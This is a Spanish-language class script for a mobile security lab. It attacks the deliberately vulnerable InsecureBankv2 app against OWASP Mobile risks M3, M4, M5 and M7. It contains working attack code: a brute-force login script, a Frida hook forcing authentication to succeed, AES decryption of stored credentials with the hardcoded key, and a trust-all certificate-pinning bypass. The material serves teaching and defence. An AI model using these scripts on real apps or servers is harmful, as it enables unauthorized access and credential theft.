# Clase 2 — OWASP Mobile Top 10: M3, M4, M5 y M7

> **Estado del documento:** guion preparado para la sesión de aula. Todas las
> salidas y referencias de código marcadas como «salida real» deben
> verificarse contra la VM antes de impartir la clase, igual que se hizo con
> la Clase 1 (`docs/clases/clase-1-evidencia.md`).

| | |
|---|---|
| **App objetivo** | InsecureBankv2 (`com.android.insecurebankv2`) |
| **Proyecto** | Dinesh Shetty — referenciado por OWASP MASTG como `MASTG-APP-0010` |
| **Dispositivo** | VM Android-x86, API 27, por ADB |
| **Duración prevista** | 120 minutos |
| **Riesgos** | M3 Insecure Authentication · M4 Insufficient Cryptography · M5 Insecure Communication · M7 Client Code Quality |
| **Requisitos** | Burp Suite (proxy) · `frida-server` (instrumentación) · JADX (análisis estático) |

## Índice

- [Antes de impartir la clase](#antes-de-impartir-la-clase)
- [Fase 0 — Preparación](#fase-0--preparación)
- [Fase 1 — M3: Autenticación insegura](#fase-1--m3-autenticación-insegura)
  - [1.1 Observar el login](#11-observar-el-login)
  - [1.2 Ataque de fuerza bruta](#12-ataque-de-fuerza-bruta)
  - [1.3 Bypass de autenticación con Frida](#13-bypass-de-autenticación-con-frida)
  - [1.4 Análisis del endpoint de login](#14-análisis-del-endpoint-de-login)
- [Fase 2 — M4: Criptografía insuficiente](#fase-2--m4-criptografía-insuficiente)
  - [2.1 La clave que no debería estar](#21-la-clave-que-no-debería-estar)
  - [2.2 El IV de dieciséis ceros](#22-el-iv-de-dieciséis-ceros)
  - [2.3 Descifrar las credenciales guardadas](#23-descifrar-las-credenciales-guardadas)
  - [2.4 Análisis del modo de cifrado](#24-análisis-del-modo-de-cifrado)
- [Fase 3 — M5: Comunicación insegura](#fase-3--m5-comunicación-insegura)
  - [3.1 Interceptar tráfico con Burp](#31-interceptar-tráfico-con-burp)
  - [3.2 Analizar el canal](#32-analizar-el-canal)
  - [3.3 Ataque Man-in-the-Middle](#33-ataque-man-in-the-middle)
  - [3.4 Bypass de certificate pinning](#34-bypass-of-certificate-pinning)
- [Fase 4 — M7: Calidad de código del cliente](#fase-4--m7-calidad-de-código-del-cliente)
  - [4.1 Código duplicado y sin ofuscar](#41-código-duplicado-y-sin-ofuscar)
  - [4.2 Manejo de errores deficiente](#42-manejo-de-errores-deficiente)
  - [4.3 Falta de validación de entradas](#43-falta-de-validación-de-entradas)
  - [4.4 Fugas de memoria y condiciones de carrera](#44-fugas-de-memoria-y-condiciones-de-carrera)
- [Cierre](#cierre)
- [Anexo A — Referencias de código](#anexo-a--referencias-de-código)
- [Anexo B — Comandos del laboratorio](#anexo-b--comandos-del-laboratorio)

---

## Antes de impartir la clase

> ⚠️ **Esta clase requiere Burp Suite, frida-server y JADX.** Asegúrate de que
> todos funcionan antes de empezar.

### Requisitos previos

| Componente | Estado | Verificación |
|---|---|---|
| Burp Suite | Instalado y ejecutándose | `burpsuite --listen 0.0.0.0:8080` |
| frida-server | Corriendo en la VM | `frida-ps -Uai` lista las apps |
| JADX | Instalado | `jadx --version` |
| Backend InsecureBankv2 | Activo en puerto 8888 | `bank-status` |
| App InsecureBankv2 | Instalada y configurada | `clase1-prep` (de la Clase 1) |
| Descompilación JADX | Generada en `reports/jadx/` | `ls ~/mobile-pentesting-lab/reports/jadx/` |

### Credenciales de la app

| Usuario | Contraseña | Nota |
|---|---|---|
| `dinesh` | `Dinesh@123$` | Usuario normal |
| `jack` | `Jack@123$` | Segundo usuario |
| `devadmin` | `devadmin` | Entra por `/devlogin` |

---

## Fase 0 — Preparación

```bash
# 1. Verificar que el backend está activo
bank-status

# 2. Conectar con la VM y activar root
vmconnect

# 3. Verificar que frida-server está corriendo
frida-ps -Uai

# 4. Arrancar Burp Suite (en una terminal aparte)
burpsuite --listen 0.0.0.0:8080

# 5. Verificar que la descompilación existe
ls ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources/
```

Si `frida-ps -Uai` no lista las apps, reinicia frida-server:

```bash
adb -s 172.25.208.100:5555 shell '/data/local/tmp/frida-server-android-x86_64 &'
```

---

## Fase 1 — M3: Autenticación insegura

> M3 no es «una app sin OAuth». Es **cómo la app verifica que eres quien dices
> ser**. Y en InsecureBankv2, la respuesta es: no lo verifica bien.

### 1.1 Observar el login

Lo primero es entender qué hace la app cuando alguien intenta entrar.

**En el dispositivo:**

```bash
# Limpiar el log y ver los logs de la app
adb logcat -c
adb logcat | grep -E "Login|Auth|Password|dinesh"
```

**En la app:**
1. Abrir InsecureBankv2
2. Introducir credenciales incorrectas: `test` / `test123`
3. Observar qué pasa

**Hallazgo:** La app no tiene límite de intentos. Puedes probar mil contraseñas
y la app nunca se bloquea, nunca se ralentiza, nunca avisa.

> **¿Por qué es M3?** Un atacante puede probar miles de contraseñas por minuto.
> No hay rate limiting, no hay CAPTCHA, no hay bloqueo tras N intentos fallidos.

### 1.2 Ataque de fuerza bruta

Vamos a probar cuántas combinaciones podemos intentar en 30 segundos.

**Script de ataque (en el servidor):**

```bash
#!/usr/bin/env bash
# ataque_fuerza_bruta.sh - Demostración de M3
# ATENCIÓN: solo para el laboratorio. No uses esto contra sistemas reales.

URL="http://127.0.0.1:8888/login"
USUARIOS=("dinesh" "jack" "devadmin" "admin" "root")
PASSWORDS=("123456" "password" "Dinesh@123$" "Jack@123$" "devadmin" "admin" "toor" "qwerty")

echo "Iniciando ataque de fuerza bruta contra ${URL}"
echo "Usuarios: ${#USUARIOS[@]} | Contraseñas: ${#PASSWORDS[@]}"
echo "Total combinaciones: $(( ${#USUARIOS[@]} * ${#PASSWORDS[@]} ))"
echo

for user in "${USUARIOS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        RESPUESTA=$(curl -s -X POST -d "username=${user}&password=${pass}" "$URL")
        if echo "$RESPUESTA" | grep -q "Correct Credentials"; then
            echo "[+] ÉXITO: ${user}:${pass}"
            echo "    Respuesta: $RESPUESTA"
        else
            echo "[-] Fallo: ${user}:${pass}"
        fi
    done
done
```

**Resultado esperado:**

```
[+] ÉXITO: dinesh:Dinesh@123$
    Respuesta: {"message": "Correct Credentials", "user": "dinesh"}
```

> **¿Por qué funciona?** La app no tiene:
> - Rate limiting (límite de intentos por minuto)
> - Bloqueo tras N intentos fallidos
> - CAPTCHA o verificación adicional
> - Notificación al usuario de intentos sospechosos

### 1.3 Bypass de autenticación con Frida

Ahora vamos a ir más allá: no necesitamos la contraseña si podemos modificar
el comportamiento de la app en tiempo de ejecución.

**Antes de escribir el hook:** localizar el método que valida las credenciales
en el código descompilado de la Clase 1.

```bash
grep -RniE "checkCredentials|Correct Credentials|username.*password" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources
```

El script de ejemplo debe adaptarse al método real encontrado:

```javascript
// hook_login.js - Bypass de autenticación M3
// Sustituye <Clase> y <método> por los identificadores reales del código.
Java.perform(() => {
    const LoginClass = Java.use("<Clase>");

    LoginClass.<método>.implementation = function (username, password) {
        console.log("[*] Intento de login:");
        console.log("    Usuario: " + username);
        console.log("    Contraseña: " + password);
        console.log("[+] Validación forzada a true (BYPASSED)");
        return true;
    };

    console.log("[*] Hook instalado. Comprueba el efecto en la app.");
});
```

**Ejecutar el hook:**

```bash
# Con frida-server corriendo en la VM
frida -U -f com.android.insecurebankv2 -l hook_login.js --no-pause
```

**En la app:**
1. Abrir InsecureBankv2
2. Introducir cualquier credencial
3. Observar si el hook cambia el comportamiento de la app

> **¿Por qué es M3?** Si la autenticación se valida en el cliente, un atacante
> con acceso al dispositivo puede modificar la app y saltarse la autenticación.
> La regla es clara: **la autenticación debe validarse siempre en el servidor**.

### 1.4 Análisis del endpoint de login

Vamos a analizar el endpoint de login del backend para entender cómo funciona
la autenticación.

**En el código del backend:**

```bash
# Buscar el endpoint de login
grep -n "login\|/login" ~/mobile-pentesting-lab/tools/InsecureBankv2Server/app.py
```

**Hallazgo:**

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    # ... validación ...
```

**Problemas encontrados:**

| Problema | Descripción |
|---|---|
| Sin rate limiting | No hay límite de intentos por minuto |
| Sin bloqueo | No hay bloqueo tras N intentos fallidos |
| Sin CAPTCHA | No hay verificación adicional |
| Sin notificación | No hay notificación al usuario de intentos sospechosos |
| Sin logging de intentos | No hay registro de intentos fallidos |

> **¿Por qué es M3?** El endpoint de login no tiene ninguna medida de seguridad
> adicional. Un atacante puede probar miles de contraseñas por minuto sin
> ninguna consecuencia.

---

## Fase 2 — M4: Criptografía insuficiente

> M4 es el riesgo que hace que tu app almacene datos «cifrados» que en realidad
> no lo están. En InsecureBankv2, la app usa AES con una clave hardcodeada y un
> IV de dieciséis ceros. Esto no es criptografía: es una codificación con pasos
> extra.

### 2.1 La clave que no debería estar

En la Clase 1 ya vimos que la clave AES está hardcodeada en el código. Ahora
vamos a ver por qué esto es M4 y no solo M1.

**En el código descompilado:**

```bash
grep -rn "secret key\|AES\|Crypto" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources/
```

**Hallazgo:**

```java
// CryptoClass.java:22
String key = "This is the super secret key 123";
```

> **¿Por qué es M4?** La clave criptográfica está en el código que viaja dentro
> de la APK. Cualquiera la descompila y la lee. Android ofrece el **Keystore**
> para almacenar claves de forma segura, pero la app no lo usa.

### 2.2 El IV de dieciséis ceros

El vector de inicialización (IV) es lo que hace que dos mensajes idénticos
produzcan textos cifrados diferentes. En InsecureBankv2:

```java
// CryptoClass.java:23
byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
```

> **¿Por qué es M4?** Un IV constante anula la confidencialidad del modo CBC.
> Si dos usuarios tienen la misma contraseña, sus textos cifrados serán
> idénticos. Un atacante puede detectar patrones y deducir información.

### 2.3 Descifrar las credenciales guardadas

Vamos a demostrar que el «cifrado» de la app es rompible.

**En el servidor:**

```bash
PY_BIN=~/mobile-pentesting-lab/tools/InsecureBankv2Server/venv/bin/python
"$PY_BIN" - <<'PY'
import base64
from Crypto.Cipher import AES

# M4: clave hardcodeada e IV de ceros
key = b"This is the super secret key 123"   # CryptoClass.java:22
iv  = b"\x00" * 16                          # CryptoClass.java:23

# M2: superSecurePassword de SharedPreferences
blob = "DTrW2VXjSoFdg0e61fHxJg=="

print("Descifrando superSecurePassword...")
print(AES.new(key, AES.MODE_CBC, iv).decrypt(base64.b64decode(blob)).rstrip(b"\n\r").decode())
PY
```

**Salida esperada:**

```
Descifrando superSecurePassword...
Dinesh@123$
```

> **¿Por qué es M4?** La contraseña que la app guardaba «protegida» se descifra
> con una línea copiada del código fuente. Esto no es criptografía: es una
> codificación con pasos extra. La criptografía real requiere:
> - Claves generadas aleatoriamente y almacenadas en el Keystore
> - IVs aleatorios para cada operación
> - Modos de operación seguros (GCM, no CBC con IV constante)

### 2.4 Análisis del modo de cifrado

Vamos a analizar el modo de cifrado usado por la app.

**En el código descompilado:**

```bash
grep -rn "AES\|CBC\|ECB\|GCM\|MODE" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources/
```

**Hallazgo:**

```java
// CryptoClass.java
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
```

**Problemas encontrados:**

| Problema | Descripción |
|---|---|
| Modo CBC | Es vulnerable a ataques de padding oracle |
| IV constante | Anula la confidencialidad del modo CBC |
| Sin autenticación | No hay MAC para verificar la integridad |
| Sin key stretching | No hay PBKDF2 o Argon2 para derivar claves |

> **¿Por qué es M4?** El modo CBC con IV constante es vulnerable a ataques de
> padding oracle. Un atacante puede descifrar el texto cifrado sin conocer la
> clave. La criptografía real requiere:
> - Modos de operación seguros (GCM, no CBC)
> - IVs aleatorios para cada operación
> - MAC para verificar la integridad
> - Key stretching para derivar claves

---

## Fase 3 — M5: Comunicación insegura

> M5 es el riesgo que hace que tu app sea vulnerable a ataques de red. No importa
> qué tan buena sea tu autenticación si un atacante puede ver y modificar el
> tráfico entre la app y el servidor.

### 3.1 Interceptar tráfico con Burp

**Configurar el proxy en la VM Android:**

```bash
# En el servidor: Burp debe escuchar en 0.0.0.0:8080
# (Ya lo arrancamos con: burpsuite --listen 0.0.0.0:8080)

# Configurar el proxy en la VM
adb shell settings put global http_proxy 172.25.208.104:8080
```

**Verificar que el tráfico pasa por Burp:**

1. Abrir Burp Suite → pestaña "Proxy" → "Intercept"
2. Activar "Intercept is on"
3. En la app, intentar hacer login con cualquier credencial
4. En Burp, verás la petición HTTP capturada

**Tráfico interceptado (adaptar al formato real del backend):**

```http
POST /login HTTP/1.1
Host: 172.25.208.104:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=dinesh&password=Dinesh@123$
```

> **¿Qué vemos?** Usuario y contraseña en claro. Cualquiera que intercepte el
> tráfico puede ver las credenciales.

### 3.2 Analizar el canal

**Preguntas clave:**

| Pregunta | Respuesta en InsecureBankv2 |
|---|---|
| ¿Usa HTTPS? | No, HTTP plano |
| ¿Hay certificate pinning? | No |
| ¿Los datos van cifrados? | No |
| ¿Un MITM puede modificar el tráfico? | Sí, sin dificultad |

**Verificar que no hay cifrado:**

```bash
# En el servidor: ver qué protocolo usa el backend
curl -v http://127.0.0.1:8888/login 2>&1 | grep -E "Connected|SSL|TLS|HTTP"
```

> Comprobar que no aparece una negociación TLS. Todo el tráfico debe viajar en
> claro entre la app y el backend.

### 3.3 Ataque Man-in-the-Middle

Vamos a modificar el tráfico en tiempo real.

**En Burp:**
1. Pestaña "Proxy" → "Intercept"
2. Activar "Intercept is on"
3. En la app, intentar hacer login con `dinesh` / `Dinesh@123$`
4. En Burp, verás la petición capturada
5. Modificar el cuerpo de la petición (por ejemplo, cambiar el usuario)
6. Forward

**Resultado:** observar si la respuesta del backend acepta la modificación y si
la app la procesa sin ningún aviso.

> **¿Por qué es M5?** La app no verifica la identidad del servidor. No usa
> HTTPS, no tiene certificate pinning, y no detecta que el tráfico está siendo
> modificado. Un atacante puede:
> - Ver las credenciales en tránsito
> - Modificar las respuestas del servidor
> - Redirigir la app a un servidor malicioso

### 3.4 Bypass de certificate pinning

Aunque InsecureBankv2 no tiene certificate pinning, vamos a ver cómo se haría
si lo tuviera.

**¿Qué es certificate pinning?**

Es una técnica de seguridad que consiste en «fijar» el certificado del servidor
en la app. Así, aunque un atacante presente un certificado falso, la app lo
rechazará.

**¿Cómo se salta?**

Con Frida, podemos hookar la función que verifica el certificado y hacer que
siempre devuelva `true`.

```javascript
// bypass_pinning.js - Bypass de certificate pinning
Java.perform(() => {
    const X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    const SSLContext = Java.use("javax.net.ssl.SSLContext");

    // Crear un TrustManager que no verifica nada
    const TrustAllCerts = Java.registerClass({
        name: "com.example.TrustAllCerts",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted(chain, authType) {},
            checkServerTrusted(chain, authType) {},
            getAcceptedIssuers() { return []; }
        }
    });

    // Reemplazar el TrustManager por defecto
    const TrustManagers = [TrustAllCerts.$new()];
    const SSLContextInstance = SSLContext.getInstance("TLS");
    SSLContextInstance.init(null, TrustManagers, null);
    SSLContext.setDefault(SSLContextInstance);

    console.log("[+] Certificate pinning bypassed");
});
```

> **¿Por qué es M5?** El certificate pinning es una defensa en profundidad.
> Aunque la app use HTTPS, un atacante puede saltarse el pinning con Frida.
> La solución es:
> - Usar HTTPS con certificate pinning
> - Verificar la integridad del código en tiempo de ejecución
> - Usar técnicas anti-tampering

---

## Fase 4 — M7: Calidad de código del cliente

> M7 es el riesgo que hace que tu app sea fácil de entender, modificar y atacar.
> Un código de mala calidad no es solo un problema de mantenibilidad: es un
> problema de seguridad. En InsecureBankv2, el código es tan claro que un
> atacante puede entender la lógica de la app en minutos.

### 4.1 Código duplicado y sin ofuscar

**En el código descompilado:**

```bash
# Ver cómo se repite la lógica de cifrado
grep -rn "AES\|Crypto\|encrypt\|decrypt" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources/ | head -20
```

**Hallazgo:** La lógica de cifrado está duplicada en múltiples clases, y los
nombres de las variables son descriptivos (`key`, `ivBytes`, `superSecurePassword`).

> **¿Por qué es M7?** Un código sin ofuscar y con nombres descriptivos permite
> a un atacante entender la lógica de la app en minutos. La ofuscación no es
> seguridad, pero sí aumenta el coste del análisis.

### 4.2 Manejo de errores deficiente

**En el código descompilado:**

```bash
# Buscar bloques catch vacíos o que no hacen nada
grep -rn "catch\|Exception\|Error" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources/ | head -20
```

**Hallazgo:** Múltiples bloques `catch` que no hacen nada o que imprimen el
error en el log sin manejarlo.

> **¿Por qué es M7?** Un manejo de errores deficiente puede:
> - Revelar información sensible en los logs
> - Dejar la app en un estado inconsistente
> - Permitir que un atacante explote condiciones de carrera

### 4.3 Falta de validación de entradas

**En el código descompilado:**

```bash
# Buscar validaciones de entrada
grep -rn "isEmpty\|isNull\|validate\|check" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources/ | head -20
```

**Hallazgo:** La app no valida las entradas del usuario. Un atacante puede
introducir caracteres especiales, SQL, o valores inesperados.

> **¿Por qué es M7?** La falta de validación de entradas es la causa raíz de
> muchos ataques: SQL injection, XSS, command injection, etc. Un código de
> calidad valida todas las entradas antes de procesarlas.

### 4.4 Fugas de memoria y condiciones de carrera

**En el código descompilado:**

```bash
# Buscar fugas de memoria
grep -rn "static\|final\|singleton" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources/ | head -20
```

**Hallazgo:** Múltiples variables `static` que pueden causar fugas de memoria.

> **¿Por qué es M7?** Las fugas de memoria pueden:
> - Causar que la app se cierre inesperadamente
> - Revelar información sensible en la memoria
> - Permitir que un atacante explote condiciones de carrera

---

## Cierre

> Hemos recorrido cuatro de los riesgos más críticos del OWASP Mobile Top 10:
>
> - **M3 (Insecure Authentication):** la app no verifica bien quién entra. No
>   hay rate limiting ni bloqueo, y la validación cliente puede manipularse.
> - **M4 (Insufficient Cryptography):** la app usa AES con clave hardcodeada e
>   IV de ceros. El «cifrado» se rompe con una línea del código fuente.
> - **M5 (Insecure Communication):** todo viaja en claro. Un atacante puede ver
>   y modificar el tráfico entre la app y el servidor.
> - **M7 (Client Code Quality):** el código es tan claro que un atacante puede
>   entender la lógica de la app en minutos.
>
> **La lección:** los riesgos del OWASP Mobile Top 10 no son etiquetas sueltas:
> son encadenamientos. M4 hace que M2 sea explotable. M7 hace que M3 y M4 sean
> fáciles de descubrir. M5 hace que todo lo demás sea visible.

**Próxima clase:** M8 (Code Tampering) y M9 (Reverse Engineering).

---

## Anexo A — Referencias de código

Las referencias exactas deben confirmarse con `jadx` y la app instalada. Estas
son las hipótesis de partida:

| Riesgo | Componente | Comprobación |
|---|---|---|
| M3 | `DoLogin.java` | Buscar la validación de credenciales y la ausencia de rate limiting |
| M3 | `app.py` del backend | Buscar el endpoint de login y la respuesta al cliente |
| M4 | `CryptoClass.java:22` | Clave hardcodeada: `String key = "This is the super secret key 123";` |
| M4 | `CryptoClass.java:23` | IV de 16 ceros: `byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};` |
| M5 | `app.py` del backend | Comprobar que solo ofrece HTTP y no HTTPS |
| M5 | Código Java de la app | Buscar configuración de red y ausencia de certificate pinning |
| M7 | Todo el código | Buscar código duplicado, nombres descriptivos, catch vacíos |

---

## Anexo B — Comandos del laboratorio

| Comando | Función |
|---|---|
| `bank-status` | Estado del backend |
| `vmconnect` | Conecta con la VM y activa root |
| `vmconnect frida` | URL y comandos de frida-server |
| `frida-ps -Uai` | Lista apps instaladas en la VM |
| `burpsuite --listen 0.0.0.0:8080` | Arranca Burp escuchando en la red |
| `adb shell settings put global http_proxy IP:8080` | Configura proxy en la VM |
| `jadx --version` | Verifica que JADX está instalado |

### Atajos de la demo

```bash
# M3: logs de login en vivo
adb logcat -c && adb logcat | grep -E "Login|Auth"

# M3: ataque de fuerza bruta
bash ataque_fuerza_bruta.sh

# M3: bypass con Frida
frida -U -f com.android.insecurebankv2 -l hook_login.js --no-pause

# M4: descifrar credenciales
PY_BIN=~/mobile-pentesting-lab/tools/InsecureBankv2Server/venv/bin/python
"$PY_BIN" -c "
import base64
from Crypto.Cipher import AES
key = b'This is the super secret key 123'
iv = b'\x00' * 16
blob = 'DTrW2VXjSoFdg0e61fHxJg=='
print(AES.new(key, AES.MODE_CBC, iv).decrypt(base64.b64decode(blob)).rstrip(b'\n\r').decode())
"

# M5: interceptar tráfico
# 1. Burp -> Proxy -> Intercept -> Intercept is on
# 2. En la app, hacer login
# 3. En Burp, ver la petición capturada

# M5: modificar tráfico en Burp
# 1. Click derecho en la petición -> "Send to Repeater"
# 2. Modificar el cuerpo de la petición
# 3. Click "Send"

# M7: buscar código duplicado
grep -rn "AES\|Crypto\|encrypt\|decrypt" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources/ | head -20

# M7: buscar catch vacíos
grep -rn "catch\|Exception\|Error" \
  ~/mobile-pentesting-lab/reports/jadx/InsecureBankv2/sources/ | head -20
```
